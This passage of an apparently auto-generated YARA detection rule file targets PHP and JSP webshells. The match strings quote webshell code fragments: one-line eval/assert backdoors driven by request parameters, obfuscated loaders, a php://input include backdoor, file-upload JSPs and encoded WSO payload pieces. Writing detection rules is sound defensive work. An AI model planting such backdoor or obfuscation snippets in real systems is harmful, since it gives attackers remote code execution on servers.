      $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
      $s2 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
      $s3 = "}if(act.equals(\"login\"))" fullword ascii
      $s4 = "<%!private String password=\"hehe\";//??????%>" fullword ascii
      $s5 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
      $s6 = "String content=request.getParameter(\"content\");" fullword ascii
      $s7 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
      $s8 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
      $s9 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
      $s10 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
      $s11 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
      $s12 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
      $s13 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
      $s14 = "out.println(\"Error\");" fullword ascii
      $s15 = "String path=request.getParameter(\"path\");" fullword ascii
      $s16 = "String url=request.getRequestURI();" fullword ascii
      $s17 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
      $s18 = "{act=request.getParameter(\"act\").toString();}" fullword ascii
      $s19 = "    if(pass.equals(password))" fullword ascii
      $s20 = "out.println(\"<input type='submit' value='save!'>\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      8 of them
}

rule webshell_php_odd {
   meta:
      description = "webshell - file odd.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fda008cf080ef1e411c7374aad0f3786283b958e701ada4f8751afb45f8bf8d7"
   strings:
      $s1 = "// overrides the php.ini settings using ini_set :)" fullword ascii
      $s2 = "// uses include('php://input') to execute arbritary code" fullword ascii
      $s3 = "// Any valid PHP code sent as raw POST data to backdoor is ran" fullword ascii
      $s4 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword ascii
      $s5 = "// php://input based backdoor" fullword ascii
      $s6 = "// Insecurety Research 2013 | insecurety.net" fullword ascii
      $s7 = "include('php://input');" fullword ascii
      $s8 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 1KB and
      all of them
}

rule system2022_08_22_2 {
   meta:
      description = "webshell - file system2022-08-22-2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "856beff7281e884c4c6e6ee98edbfd4c2e76f9372c8426f30f1681e0553f85ee"
   strings:
      $s1 = "//bypass " fullword ascii
      $s2 = "@unserialize('O:1:\"A\":1:{s:10:\" A comment\";N;}');" fullword ascii
      $s3 = "    public function __construct(){}" fullword ascii
      $s4 = "    public function __wakeup(){" fullword ascii
      $s5 = " and TAV" fullword ascii
      $s6 = "        $b = $_GET[1];" fullword ascii
      $s7 = "class A{" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule system2022_08_22_3 {
   meta:
      description = "webshell - file system2022-08-22-3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dd508307f890734b7a6022cd57acf6ffa23c400f67e95be6c18d25d89d58577a"
   strings:
      $s1 = "//bypass " fullword ascii
      $s2 = "$filename($command);" fullword ascii
      $s3 = "$command=$_POST[1];" fullword ascii
      $s4 = "$filename=substr(__FILE__,-10,6);" fullword ascii
      $s5 = "system" fullword ascii /* Goodware String - occured 1577 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule bypass_waf_2015_06_16_03 {
   meta:
      description = "webshell - file bypass-waf-2015-06-16-03.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7961c837a381b0cbcb8fe66828ec1422715b64a071cef726b3eac5b5e69e5d16"
   strings:
      $s1 = "$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4(\"$;*,.\", \"\", $vvnr1.$hitq5.$qajd2.$itfh2)))); $foxl6(); " fullword ascii
      $s2 = "$hygg4 = $akmi4(\"so0\", \"\", \"so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e\");// qbhm1 " fullword ascii
      $s3 = "$qajd2=\"VDFOVVd5\";$vvnr1=\"UUdWMllX\";$hitq5=\"d29KRjlR\";$itfh2=\"ZGtabmg2Y1RRblhTazc=\";// dfxzq4 " fullword ascii
      $s4 = "$gzsw5 = $akmi4(\"qik6\",\"\",\"qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n\");// kfcs6 " fullword ascii
      $s5 = "$akmi4 = str_replace(\"eu2\",\"\",\"eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce\");// ulgp9 " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_09 {
   meta:
      description = "webshell - file 2020.08.20.09.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cc84dbd3962629549288dc3d1624bba44499f8fb1f62460de7efdead65592078"
   strings:
      $s1 = "    array_filter(array($_POST['x']),'assert');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_08_26_06 {
   meta:
      description = "webshell - file 2022-08-26-06.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "53b06c5e45b4972c539466dbbc71ef635cf3989c3fd39c84e54316db02cfbce9"
   strings:
      $s1 = "  if ($_GET['p']=='password'){" fullword ascii
      $s2 = "    $_GET['f']($_GET['a']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_08_26_07 {
   meta:
      description = "webshell - file 2022-08-26-07.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3f5d83cb2231c81ca96ff05d316f163fb67d1d407906e9e51cd424601a6bab3a"
   strings:
      $s1 = "    $_GET['f']($_GET['a']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule pass_waf_2014_10_19 {
   meta:
      description = "webshell - file pass-waf-2014-10-19.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "430eb05a94f2af4a67e45b76444a008c6cd61df0c9f2fe2b5097662d82d9b495"
   strings:
      $s1 = "$array[0]['tt']($_POST['tt1234']);  //caidao  password: tt1234 " fullword ascii
      $s2 = "$item['tt'] = 'assert'; " fullword ascii
      $s3 = "$array[] = $item; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_wsproxy {
   meta:
      description = "webshell - file wsproxy.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "01fb2195996b654410d45165d7c47a0bf437b102e4408205c93eb9c5c4baec3e"
   strings:
      $s1 = "<%@ page import=\"java.nio.channels.CompletionHandler\" %>" fullword ascii
      $s2 = "                        process(message,session);" fullword ascii
      $s3 = "        void process(ByteBuffer z,Session channel)" fullword ascii
      $s4 = "                    channel.getBasicRemote().sendText(\"HTTP/1.1 200 Connection Established\\r\\n\\r\\n\");" fullword ascii
      $s5 = "<%@ page import=\"java.net.InetSocketAddress\" %>" fullword ascii
      $s6 = "<%@ page import=\"java.nio.ByteBuffer\" %>" fullword ascii
      $s7 = "<%@ page import=\"javax.websocket.server.ServerEndpointConfig\" %>" fullword ascii
      $s8 = "                        channel.getBasicRemote().sendText(\"HTTP/1.1 503 Service Unavailable\\r\\n\\r\\n\");" fullword ascii
      $s9 = "<%@ page import=\"java.nio.channels.AsynchronousSocketChannel\" %>" fullword ascii
      $s10 = "<%@ page import=\"java.util.HashMap\" %>" fullword ascii
      $s11 = "        out.println(\"success, connect url path: \" + servletContext.getContextPath() + path);" fullword ascii
      $s12 = "        public void onOpen(final Session session, EndpointConfig config) {" fullword ascii
      $s13 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s14 = "            client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {" fullword ascii
      $s15 = "                    AsynchronousSocketChannel client = map.get(channel.getId());" fullword ascii
      $s16 = "<%@ page import=\"java.util.concurrent.TimeUnit\" %>" fullword ascii
      $s17 = "<%@ page import=\"java.util.concurrent.Future\" %>" fullword ascii
      $s18 = "                        future.get(10, TimeUnit.SECONDS);" fullword ascii
      $s19 = "                            ByteBuffer b = buffer.get(arr,0,result);" fullword ascii
      $s20 = "                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_cnseay_x {
   meta:
      description = "webshell - file webshell-cnseay-x.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "57d79517599c1afbe80f378c0818bd2b5261cde728a540e595c12bbcfd9e7286"
   strings:
      $s1 = "$__C_C=\"WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09\";" fullword ascii
      $s2 = "$_[00]=$__F_F('$__S_S',$__E_E.'(\"$__S_S\");');" fullword ascii
      $s3 = "$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];" fullword ascii
      $s4 = "$__O_O=$__X_X[5].$__X_X[3].\"_\";" fullword ascii
      $s5 = "@$_[00]($__H_H($__H_H($__C_C)));" fullword ascii
      $s6 = "$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];" fullword ascii
      $s7 = "$__X_X=\"123456789\";" fullword ascii
      $s8 = "$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];" fullword ascii
      $s9 = "$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];" fullword ascii
      $s10 = "$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule zone_hackbar_beutify {
   meta:
      description = "webshell - file zone_hackbar_beutify.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c359eece48797a31e807d38fbc06ea9186c53bf880f84306383b4685c3fa37ce"
   strings:
      $s1 = "$s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11] . $sF[8] . $sF[10] . $sF[1] . $sF[7] . $sF[8] ." ascii
      $s2 = "$s22 = ${strtoupper($sF[11] . $sF[0] . $sF[7] . $sF[9] . $sF[2])}['n985de9'];" fullword ascii
      $s3 = "if (isset($s22)) {" fullword ascii
      $s4 = "$s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11] . $sF[8] . $sF[10] . $sF[1] . $sF[7] . $sF[8] ." ascii
      $s5 = "$sF = \"PCT4BA6ODSE_\";" fullword ascii
      $s6 = " $sF[10]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule 2015_06_10_02 {
   meta:
      description = "webshell - file 2015-06-10-02.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "50e94c810749b2c53357efe5cd2160bcc6f45da28f8e715546992a817a164052"
   strings:
      $s1 = "<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_09_09_02 {
   meta:
      description = "webshell - file 2022-09-09-02.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f19b8ba85e9a87eceb2cab9fcbe22be903c98f1aca0c9fffab1d5d78924685e9"
   strings:
      $s1 = "$_SESSION['dmeo']=base64_decode($_COOKIE[\"PHPSESSID\"]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_12302 {
   meta:
      description = "webshell - file 12302.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b8955bc502fccaab2ef4719653480facb9576bc57632e248eaaa3f519f972ca2"
   strings:
      $s1 = "            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request." ascii
      $s2 = "            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request." ascii
      $s3 = "    <form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
      $s4 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
      $s5 = "   String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s6 = "<%@page contentType=\"text/html;charset=gb2312\"%>    " fullword ascii
      $s7 = "uestURI()+\"'><font color='red' title='????????????" fullword ascii
      $s8 = "            pt.write(context.getBytes());    " fullword ascii
      $s9 = "????:</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
      $s10 = "  <head>    " fullword ascii
      $s11 = "   String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s12 = "   if(request.getParameter(\"context\")!=null)    " fullword ascii
      $s13 = "  </head>    " fullword ascii
      $s14 = "????:</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">   " ascii
      $s15 = "    <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword ascii
      $s16 = "    <title>JspDo Code By Xiao.3</title>    " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      8 of them
}

rule webshell_jsp_123 {
   meta:
      description = "webshell - file 123.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1b4f4005e8875436be8f477427d977e811130dfcc18f627915a7c5e80a5696e5"
   strings:
      $s1 = "            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request." ascii
      $s2 = "            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request." ascii
      $s3 = "    <form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
      $s4 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
      $s5 = "   String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s6 = "<%@page contentType=\"text/html;charset=gb2312\"%>    " fullword ascii
      $s7 = "            pt.write(context.getBytes());    " fullword ascii
      $s8 = "  <head>    " fullword ascii
      $s9 = "   String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s10 = "   if(request.getParameter(\"context\")!=null)    " fullword ascii
      $s11 = "  </head>    " fullword ascii
      $s12 = "    <font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServlet" ascii
      $s13 = ".getRealPath(\"/\")); %>\">    " fullword ascii
      $s14 = "    <font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServlet" ascii
      $s15 = "    <font color=\"blue\">??????????????????:</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
      $s16 = "    <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword ascii
      $s17 = "    <title>JspDo Code By Xiao.3</title>    " fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 6KB and
      8 of them
}

rule webshell_php_zw {
   meta:
      description = "webshell - file zw.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f87cb4c19b1deb4bd9859c0ab7245b6c361eab9ea18a9e32c56b63ba62d2ce3a"
   strings:
      $s1 = "$x='J$o.=$t{$i}^J$kJ{$j};}}return $Jo;J}if (@pJreg_Jmatch(\"/$kh(J.+)J$kJf/\",J@fJile_get_contents(\"pJJhp://in';" fullword ascii
      $s2 = "$E='t_contJents(J);@ob_end_cleJan();$rJ=@bJase64J_encodJe(@x(@gzJcomprJess($o),$Jk));pJJrint(\"J$p$kh$r$kf\");}';" fullword ascii
      $s3 = "$T='puJt\"),$m)==J1) J{@Job_sJtart();@evJal(@gzuJncompJress(@x(@bJase64_JdecJode($m[J1]),$k)))JJ;$oJJ=@ob_ge';" fullword ascii
      $s4 = "$o='$kJ=\"50eJcJ93c4\";$kh=\"895JcJ0ccc987a\";$kJf=\"0abJcJa6138a3e\"J;$p=\"inO4VJnJw6Gr66szJatJ\";Jfunction x($tJ,';" fullword ascii
      $s5 = "$f=str_replace('v','','vcreatvev_fuvnvvction');" fullword ascii
      $s6 = "$B='$Jk){$c=stJrlenJJ($k);$l=JstrleJn($t);$o=\"\";fJoJr($i=0;$iJ<$Jl;){for($j=0J;($j<$c&&$i<$Jl);$j+J+,$iJ++J){';" fullword ascii
      $s7 = "$U=str_replace('J','',$o.$B.$x.$T.$E);" fullword ascii
      $s8 = "$c=$f('',$U);$c();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AntSword_2021_03_06 {
   meta:
      description = "webshell - file AntSword_2021-03-06.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e8dc361aaf79107c7d465aab582fdc453f12b86f90607a5b8d53d6cc2a79ec3c"
   strings:
      $s1 = "foreach (array('_POST') as $_request) {" fullword ascii
      $s2 = "    foreach ($$_request as $_key=>$_value) {" fullword ascii
      $s3 = "    public function __construct($para, $_value)" fullword ascii
      $s4 = "$class2 = $class1->newInstance($s0, $_value);" fullword ascii
      $s5 = "class Test1" fullword ascii
      $s6 = "print_r($class1);" fullword ascii
      $s7 = "$class1 = new ReflectionClass(\"Test1\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Get_PostpHp {
   meta:
      description = "webshell - file Get,PostpHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "36bb379c63cd372e05e677dfbf6bc5add9db4e50496e23e6e20cbe0ed6f9ca06"
   strings:
      $s1 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell {
   meta:
      description = "webshell - file webshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5da91fc77b9a132acdc4581618237121f7aaad6d321a15a7e04cd6acaed772ff"
   strings:
      $s1 = "$url='http://localhost/DebugPHP/getcode.php?call=code';" fullword ascii
      $s2 = "61737365727428245f504f53545b635d293b" ascii /* hex encoded string 'assert($_POST[c]);' */
      $s3 = "call_user_func(create_function(null,pack('H*',file_get_contents($url))));" fullword ascii
      $s4 = "//webshell.php" fullword ascii
      $s5 = "//call_user_func(create_function(null,'assert($_POST[c]);'));" fullword ascii
      $s6 = "//echo pack('H*', '61737365727428245f504f53545b635d293b');" fullword ascii
      $s7 = "//echo pack('H*', base_convert('0011000000111010', 2, 16));" fullword ascii
      $s8 = "//call_user_func(create_function(null,'echo (1+2);'));" fullword ascii
      $s9 = "00111010" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_getcode {
   meta:
      description = "webshell - file getcode.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7e467bc01a6234b961702dbe650199698f17da45e8033f4cca1c9d96e4864cb3"
   strings:
      $s1 = "61737365727428245f504f53545b635d293b" ascii /* hex encoded string 'assert($_POST[c]);' */
      $s2 = "$cmd=$_GET['call'];" fullword ascii
      $s3 = "if ($cmd=='code')  " fullword ascii
      $s4 = "//assert($_POST[c]);" fullword ascii
      $s5 = "//getcode.php    " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_404_shell_code {
   meta:
      description = "webshell - file 404 shell code.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b16c84d42b67b390360a7c3babad9e6671695d1a18db3a9357a39ad0f3e4e5f4"
   strings:
      $s1 = "$ev404(\"QlpoNDFBWSZTWYpDf+0AnxH/gH//7MR//////////7////5g7x732zZqAD6CgBbAAKaAAdsAHUe++7u7vvd7gVVTWgA6Tvvn2kV3d3qPsR9n3XucswAAOtd" ascii
      $s2 = "$helpsupportbooter = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above" ascii
      $s3 = "pdlEW3hi8OudxtqjCkvztkbB754viC0VPliHAYcM+Fl/LuAr5w4yhp9MXHN5IaAYmNhBoW7ooj3tkPXh7PLz8OTxcmddRqKA2TWTZ664wiH1wqEYyR9UGgeTWSjPPKxx" ascii
      $s4 = "$adaptiveerrorpage = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom" fullword ascii
      $s5 = "BrzU+iScTymFu36ZWKxvhcJLkSFELi2JCP5QKoD6o16YGklsYhtIgewiVVtiyVIwX3O+VGBxQoSrgUsJGk4SQgqahv9j9PT7L9GMc/o6hFTPod9PywPqmYR+C8dGn9Lk" ascii
      $s6 = "5gGTQhEKaOGA2e5mkT9J4YWIwtk587zZ8SxEOCZOlN2IknH5XbI2ySPy5IaFo0kUlwmCbYfmGDFg++M9r/Udv+H2DXpxBZNX2XWaJiJQqqAsQmLFmwwxFb2qQcZrgj7u" ascii
      $s7 = "Y8JiPiSn8DL7PHFVcW1YoFWQd6dc7EyEUXrz7uHt3Xfe2JuIYIbavnS6iFhztNhYl1BSO7nI33O15/wvDgcnkhiYlERjU78zO8NsHMMpTlYo7d2SQrFEYNyIKmI8RO2V" ascii
      $s8 = "lxPbB1B2P/Ibjg8tdFMPrzUmBM2ApuK6fzvKIlnoR8u2yw/etDnQ3yL+sPYZv9v/DSJQnXx3EOoo6ur+fmuPCpQDQdbT9H7Xj2779cn1bhiijkdwPm+hOHBvIkMVrDFI" ascii
      $s9 = "bfUa7hftPehlPaUk5p8+03d0c5yWFmGY8Z8OwZhke5f2/rEfqQG+Yuw+ggeunsK1BMp3NECtEnpwE1Aif8SLir+osCD1SrZp1GUGZAhIv9IjAzdDMD+WQKOamZ/SHhzl" ascii
      $s10 = "+V3CQSYnbTbW37G0/DTV66MxOui5tRIqnEbSG8fZYsHwsD9ECQIT403idkPWAZY5MHgHZ9sIRCIQJEOLEMJsSdHMq+y30QLd9OPJy4B3vCGljzn8qGhR6wQK9V686EFb" ascii
      $s11 = "Gnv6qZn2vho16L+VwiIiehCkvxQDCbQ845b05S9hvnhk5kkdCQkftptYHhM0CY1Qcxuhvom9vvlHxWFuDsH4S8MY14y1kAqSKiUk5DCSs0RgJLRVCSxGWgarZAxkHCN4" ascii
      $s12 = "M21kMnNzb341TvINIBpahq48Xa+qOcZ7Hvrf+lirC+S9gL04suJ05hJFxPvUfXiLGn6efP/lpo3gg3Tbpt44iSg+NcF4IwjZ/BRvsrbSenVwYf1I9jsM3uIf3ueH7Hd5" ascii
      $s13 = "sfKa2zcC5+y67xgH7eb9og6RBCUIhS7Rr689PRtG8ZCDoMs/sGIR6Xf9Gr8bJvsOfD7uHe0Z3kfIQEBdIrcYBBlyVuI+1TPFGlwMd3IkSshmwYOUSIMNNk+yXOTgMwVA" ascii
      $s14 = "Dd+rjxV0V02gIeyrUGe5qdzBQgKGETHEG1khMziKGhmifOd/s9G7U3OU6zqAkI9kZCVUOpguQDgokhCBcAgArgq0gt1FmEh7ozelkAowRkRCcuHAXJYCMdCWsiNhRpwi" ascii
      $s15 = "G0TeWaTAdwUwM55QxaefA8bVOx6avRQRyzaH39yLZYjbSBXNWS9dywVRUNJ14uer7fzaffR7ENlAkHnuez0eI/q9MD0isYp/5WUUzY5YSk84h8DjP+5CBGsqrRA18/QY" ascii
      $s16 = "hTylmsP/QiHHyCYsV+c+8go4FzQRB/i/JvsrW0vPB83MJRaNDRg7HyiU93DDCW5kK4nPHR2aGSfai8XkaAJcBx3/TM28La8jUINiXNem50He6e6WpZtlw8Q0mWdNxCmD" ascii
      $s17 = "vGIvQnyJU5POMgg0mzJOWblsYDkppj9ZsdDBuRc3hqPJNbmbV81RFfQl0WyoCI5pncoMpwjU2diLtfEC1Ek/DhUmtNhYLA7K8QIcRoVhVjsSzvP9t3JMFFAcF4hjtWw6" ascii
      $s18 = "ViWkTQ9t2MmmVBdWhyNCEUxIaxijPg1LxA0dzzq2s8cyURE6EiIhSJRGvUYkFRs8gcgDLnBECEzIwW4NvMpigKAYg24A4HF5RJBlaQyFCLqu5NfD5danhmD5+7iCoMBV" ascii
      $s19 = "tVqStCIjUUpBZa1b0OOdTfWm+dTWcrQ1GBrqrNRseiWk4ax3ibfBmHMWF5ncbUYPY8bYVxtaCDbfclloM40OHLmOdCmdprBMCnKRDHSo3hoIZ71JILIBdyVyW9DEEMVz" ascii
      $s20 = "dgZJm9Th4iGhkAQ7j6On650okS+nJjP4tgHCjBh5MUoKMAQEEBAYxkRH7L04qiKqIn2/np3MMZfpztZhWxmI6J8MES+5XVIYGk2jnhxXIyaK/trBnlJ0fRcoMhRJJnrv" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule WSO_base64 {
   meta:
      description = "webshell - file WSO_base64.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ebaac96bc2a25501436be6f89f884024169eefc6cfc41c823296460cf7071911"
   strings:
      $s1 = "<?php eval(\"?>\".base64_decode(\"PD9waHAKJGNvbG9yID0gIiNmZmYiOwokZGVmYXVsdF9hY3Rpb24gPSAnRmlsZXNNYW4nOwpAZGVmaW5lKCdTRUxGX1BBVE" ascii
      $s2 = "EJ5YjNSdllubHVZVzFsS0NkMFkzQW5LU2tnZkh3Z1pHbGxJQ0pEWVc1MElHTnlaV0YwWlNCemIyTnJaWFJjYmlJN0RRcHpaWFJ6YjJOcmIzQjBLRk1zVTA5TVgxTlBRM" ascii
      $s3 = "/* WSO 2.2.0 (Web Shell by HARD _LINUX) */" fullword ascii
      $s4 = "3JlYWNoKCRmaWxlcyBhcyAkZikgewoJCWVjaG8gJzx0cicuKCRsPycgY2xhc3M9bDEnOicnKS4nPjx0ZD48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPSJmW10iIHZhb" ascii
      $s5 = "VsxXS4iO1xuXG4iOwoJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSBgJy4kdGFibGUuJ2AnKTsKCQkJCQl3aGlsZSgkaXRlbSA9ICR0aGlzLT5mZXRjaCgpK" ascii
      $s6 = "2UgJ3Bnc3FsJzoKCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9ICR0aGlzLT5xdWVyeSgiU0VMRUNUIGRhdG5hbWUgRlJPTSBwZ19kYXRhYmFzZSIpOwoJCQkJYnJlYWs7C" ascii
      $s7 = "QkJY2FzZSAncGdzcWwnOgoJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSAnLiR0YWJsZSk7CgkJCQkJd2hpbGUoJGl0ZW0gPSAkdGhpcy0+ZmV0Y2goKSkge" ascii
      $s8 = "WQgc3R5bGU9ImJvcmRlci10b3A6MDt3aWR0aDoxMDAlO21hcmdpbjowOyIgb25rZXlkb3duPSJrcChldmVudCk7Ij4nOwoJZWNobyAnPC9mb3JtPjwvZGl2PjxzY3Jpc" ascii
      $s9 = "EdMT0JBTFNbJ2Rpc2FibGVfZnVuY3Rpb25zJ10sICdwb3NpeF9nZXRncmdpZCcpPT09ZmFsc2UpICkgeyBmdW5jdGlvbiBwb3NpeF9nZXRncmdpZCgkcCkgeyByZXR1c" ascii
      $s10 = "SkgPSBlYWNoKCRpdGVtKTsKCQkJCQkkbiA9ICRkYi0+ZmV0Y2goJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnLiR2YWx1ZS4nJykpOwoJCQkJC" ascii
      $s11 = "W91dHB1dCBzdHlsZT0iYm9yZGVyLWJvdHRvbTowO21hcmdpbjowOyIgcmVhZG9ubHk+JzsKCWlmKCFlbXB0eSgkX1BPU1RbJ3AxJ10pKSB7CgkJZWNobyBodG1sc3BlY" ascii
      $s12 = "30KCS5iaWdhcmVhCXt3aWR0aDoxMDAlO2hlaWdodDoyNTBweDsgfQoJaW5wdXQsIHRleHRhcmVhLCBzZWxlY3QJe21hcmdpbjowO2NvbG9yOiNmZmY7YmFja2dyb3VuZ" ascii
